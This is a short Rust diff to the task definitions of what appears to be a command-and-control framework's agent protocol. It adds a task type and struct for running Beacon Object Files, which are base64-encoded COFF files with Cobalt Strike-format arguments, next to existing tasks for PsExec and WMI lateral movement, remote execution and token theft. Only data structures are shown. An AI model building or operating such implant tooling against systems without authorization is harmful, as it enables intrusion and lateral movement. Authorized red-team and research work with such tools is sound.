@@ -37,6 +37,7 @@ pub enum TaskType {
     JumpPsexec,
     JumpWmi,
     RemoteExec,
+    Bof,
 }
 
 /// Command dispatched to agent (server → agent).
@@ -100,6 +101,17 @@ pub struct RemoteExecTask {
     pub method: String,
     pub target: String,
     pub command: String,
+}
+
+/// BOF execution payload — JSON-encoded in Command.command for Bof tasks.
+/// The `bof_b64` field contains the base64-encoded .o file.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct BofTask {
+    /// Base64-encoded COFF .o file bytes.
+    pub bof_b64: String,
+    /// Base64-encoded BOF arguments (Cobalt Strike binary format).
+    #[serde(default)]
+    pub args_b64: String,
 }
 
 /// steal_token payload — JSON-encoded in Command.command.
